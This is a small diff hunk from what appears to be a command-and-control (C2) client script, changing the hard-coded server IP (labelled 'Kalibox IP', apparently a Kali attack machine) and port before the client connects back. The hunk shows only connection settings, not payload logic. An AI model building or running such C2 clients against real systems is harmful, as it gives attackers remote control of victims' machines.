@@ -54,8 +54,8 @@ class C2Client:
 
 
 if __name__ == "__main__":
-    server_ip = "10.65.0.0"  #Kalibox IP
-    server_port = 4444 #basic port 
+    server_ip = "192.168.192.114"  #Kalibox IP
+    server_port = 27 #basic port 
 
     c2_client = C2Client(server_ip, server_port)
     c2_client.connect()
